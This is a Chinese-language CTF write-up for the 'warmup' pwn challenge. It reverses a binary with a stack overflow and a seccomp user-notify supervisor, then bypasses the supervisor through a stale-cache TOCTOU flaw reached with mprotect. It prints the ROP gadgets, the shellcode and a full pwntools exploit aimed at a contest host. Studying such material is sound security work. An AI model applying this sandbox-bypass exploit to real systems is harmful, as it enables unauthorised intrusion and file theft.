### warmup


入口 `0x403640` 是常规 `_start`，把 `0x402F20` 作为 main 传给 libc 启动逻辑。

关键函数：

* `0x402F20`：真正的 main，负责创建 seccomp user-notify 沙箱和父进程 supervisor。
* `0x403770`：题目业务逻辑，存在栈溢出。

IDA 反编译 `0x403770`：

```c
__int64 sub_403770()
{
  __int64 result;
  _BYTE v1[72];

  result = read(0, v1, 512);
  if ( result > 0 )
    return write(1, v1, result);
  return result;
}
```

对应汇编：

```asm
403770  sub     rsp, 48h
403774  xor     edi, edi
403776  mov     edx, 200h
40377b  mov     rsi, rsp
40377e  call    read
403783  test    rax, rax
403786  jle     short loc_403798
403788  mov     rdx, rax
40378b  mov     rsi, rsp
40378e  mov     edi, 1
403793  call    write
403798  add     rsp, 48h
40379c  retn
```

栈空间只有 `0x48`，但读入 `0x200`，返回地址偏移：

```text
offset = 0x48
```

输入会先被完整 echo，因此 exploit 里需要先接收 `0x200` 字节 echo，再读 flag 输出。

**seccomp user-notify 分析**

本题不是普通 ORW。main 中有 seccomp user-notify 结构：


1. `socketpair(AF_UNIX, SOCK_SEQPACKET, 0, fds)`
2. `fork()`
3. 子进程安装 seccomp filter，并用 `SECCOMP_FILTER_FLAG_NEW_LISTENER` 创建 listener fd。
4. 子进程把 listener fd 通过 `sendmsg + SCM_RIGHTS` 发给父进程。
5. 子进程进入漏洞函数 `sub_403770()`。
6. 父进程通过 listener 接收被拦截 syscall，决定是否放行。

父进程核心逻辑在 `0x402F20` 中：

```c
ioctl(listener_fd, SECCOMP_IOCTL_NOTIF_RECV, &req);

if (req.data.nr == SYS_open && req.data.args[0] == 0x13370000) {
    process_vm_readv(
        child_pid,
        local_iov = { 0x4C6AA0, 0x1000 },
        remote_iov = { 0x13370000, 0x1000 },
        0
    );

    if (!memcmp(0x4C6AA0, "dobedobedo", 11))
        allow = 1;
}

ioctl(listener_fd, SECCOMP_IOCTL_NOTIF_SEND, &resp);
```

也就是说：

* 普通 `open("/flag")` 会被拒绝。
* 只有当 `open` 的 pathname 指针等于 `0x13370000` 时，父进程才进一步检查。
* 父进程从子进程地址 `0x13370000` 复制 0x1000 字节到自己 `.bss` 的 `0x4C6AA0`。
* 如果复制出的内容前 11 字节是 `dobedobedo`，父进程让这个 `open` syscall 继续执行。

直接把 `0x13370000` 写成 `/flag` 不行，因为父进程检查会失败。

**syscall 放行情况**

seccomp filter 直接放行了一些 syscall，其他 syscall 交给父进程 user-notify。

直接放行的常用 syscall 包括：

```text
0   read
1   write
3   close
9   mmap
10  mprotect
12  brk
20  writev
39  getpid
60  exit
186 gettid
218 set_tid_address
228 clock_gettime
231 exit_group
273 set_robust_list
302 prlimit64
318 getrandom
334 rseq
436 close_range
```

`open` syscall 编号是 `2`，不会被直接放行，但父进程对 `open(0x13370000, ...)` 有特殊检查。

**绕过思路**

关键问题：

```text
父进程检查需要 0x13370000 指向 "dobedobedo"
内核真正执行 open 时需要 0x13370000 指向 "/flag"
```

利用点是父进程检查和内核真正取 pathname 的机制不同。

父进程使用：

```c
process_vm_readv(child_pid, ..., remote_iov = 0x13370000, ...)
```

内核 `open` 使用：

```c
copy_from_user(pathname)
```

如果把 `0x13370000` 所在页改成 write-only：

```c
mprotect(0x13370000, 0x1000, PROT_WRITE)
```

效果是：

* 子进程仍然可以写这页，所以可以把内容改成 `/flag`。
* 父进程的 `process_vm_readv` 不能读这页，会失败。
* 但父进程代码没有检查 `process_vm_readv` 的返回值。
* 父进程的缓存 `0x4C6AA0` 仍保留上一次成功读取的 `dobedobedo`。
* 于是第二次 `open(0x13370000)` 时，父进程仍看到旧缓存 `dobedobedo`，放行 syscall。
* syscall 被放行后，内核在子进程上下文中从 `0x13370000` 取 pathname，此时内容实际是 `/flag`，从而成功打开 flag 文件。

所以 shellcode 流程：


1. `mmap(0x13370000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0)`
2. 写入 `dobedobedo`
3. 第一次 `open(0x13370000, 0, 0)`，让父进程缓存 `dobedobedo`
4. 把 `0x13370000` 改成 `/flag`
5. `mprotect(0x13370000, 0x1000, PROT_WRITE)`
6. 第二次 `open(0x13370000, 0, 0)`，父进程检查失败但不清空旧缓存，仍放行
7. `read(fd, buf, 0x100)`
8. `write(1, buf, size)`

由于 NX 开启，不能直接执行栈上的 shellcode。利用分两阶段。

Stage 1：ROP 读 shellcode 并改 `.bss` 权限

可用 gadget：

```python
POP_RDI_RBP = 0x40411D      # pop rdi ; pop rbp ; ret
POP_RSI     = 0x4016A5      # pop rsi ; ret
POP_RAX     = 0x423883      # pop rax ; ret
POP_RCX     = 0x40DC51      # pop rcx ; ret
XCHG_RDX_RAX = 0x41925A     # xchg rax, rdx ; ret
READ        = 0x41B760
SYSCALL_ANY = 0x41C320
```

`SYSCALL_ANY = 0x41C320` 是一个通用 syscall wrapper：

```asm
41c320  mov     rax, rdi
41c327  mov     rdi, rsi
41c32a  mov     rsi, rdx
41c32d  mov     rdx, rcx
41c330  mov     r10, r8
41c333  mov     r8, r9
41c336  mov     r9, [rsp+8]
41c33b  syscall
```

Stage 1 做：

```python
read(0, BSS, 0x400)
mprotect(BSS, 0x1000, 7)
jmp BSS
```

这里 `BSS = 0x4C9000`。

Stage 2：shellcode 绕过 seccomp 检查

核心 shellcode：

```asm
mov eax, 9
mov edi, 0x13370000
mov esi, 0x1000
mov edx, 3
mov r10d, 0x32
mov r8, -1
xor r9d, r9d
syscall

mov rdi, 0x13370000
mov rax, 0x65626f6465626f64
mov qword ptr [rdi], rax
mov dword ptr [rdi+8], 0x6f64

mov eax, 2
mov rdi, 0x13370000
xor esi, esi
xor edx, edx
syscall

mov rdi, 0x13370000
mov rax, 0x67616c662f
mov qword ptr [rdi], rax

mov eax, 10
mov rdi, 0x13370000
mov esi, 0x1000
mov edx, 2
syscall

mov eax, 2
mov rdi, 0x13370000
xor esi, esi
xor edx, edx
syscall

mov rdi, rax
xor eax, eax
mov esi, 0x4C9500
mov edx, 0x100
syscall

mov edx, eax
mov eax, 1
mov edi, 1
mov esi, 0x4C9500
syscall
```

完整 exploit
python3 exp.py
脚本内容：

```python
#!/usr/bin/env python3
from pwn import *

context.clear(arch="amd64", os="linux")

HOST = args.HOST or "60.205.163.215"
PORT = int(args.PORT or 28317)

POP_RDI_RBP = 0x40411D
POP_RSI = 0x4016A5
POP_RAX = 0x423883
POP_RCX = 0x40DC51
XCHG_RDX_RAX = 0x41925A
READ = 0x41B760
SYSCALL_ANY = 0x41C320

BSS = 0x4C9000
FLAG_BUF = BSS + 0x500
PATH = 0x13370000

\
def set_rdi(value):
    return [POP_RDI_RBP, value, 0]

\
def set_rsi(value):
    return [POP_RSI, value]

\
def set_rdx(value):
    return [POP_RAX, value, XCHG_RDX_RAX]

\
def set_rcx(value):
    return [POP_RCX, value]

\
def call_read(fd, buf, size):
    return set_rdi(fd) + set_rsi(buf) + set_rdx(size) + [READ]

\
def call_mprotect(addr, size, prot):
    return (
        set_rdi(10)
        + set_rsi(addr)
        + set_rdx(size)
        + set_rcx(prot)
        + [SYSCALL_ANY, POP_RAX, 0]
    )

\
def build_stage1():
    chain = []
    chain += call_read(0, BSS, 0x400)
    chain += call_mprotect(BSS, 0x1000, 7)
    chain += [BSS]
    return flat({0x48: flat(chain)}, filler=b"A").ljust(0x200, b"B")

\
def build_stage2():
    return asm(
        f"""
        mov eax, 9
        mov edi, {PATH}
        mov esi, 0x1000
        mov edx, 3
        mov r10d, 0x32
        mov r8, -1
        xor r9d, r9d
        syscall

        mov rdi, {PATH}
        mov rax, 0x65626f6465626f64
        mov qword ptr [rdi], rax
        mov dword ptr [rdi+8], 0x6f64

        mov eax, 2
        mov rdi, {PATH}
        xor esi, esi
        xor edx, edx
        syscall

        mov rdi, {PATH}
        mov rax, 0x67616c662f
        mov qword ptr [rdi], rax

        mov eax, 10
        mov rdi, {PATH}
        mov esi, 0x1000
        mov edx, 2
        syscall

        mov eax, 2
        mov rdi, {PATH}
        xor esi, esi
        xor edx, edx
        syscall

        mov rdi, rax
        xor eax, eax
        mov esi, {FLAG_BUF}
        mov edx, 0x100
        syscall

        mov edx, eax
        mov eax, 1
        mov edi, 1
        mov esi, {FLAG_BUF}
        syscall

        mov eax, 60
        xor edi, edi
        syscall
        """
    )

\
def main():
    io = remote(HOST, PORT)
    stage1 = build_stage1()
    io.send(stage1 + build_stage2())
    io.recvn(len(stage1))
    print(io.recvall(timeout=3).decode(errors="ignore"), end="")

\
if __name__ == "__main__":
    main()
```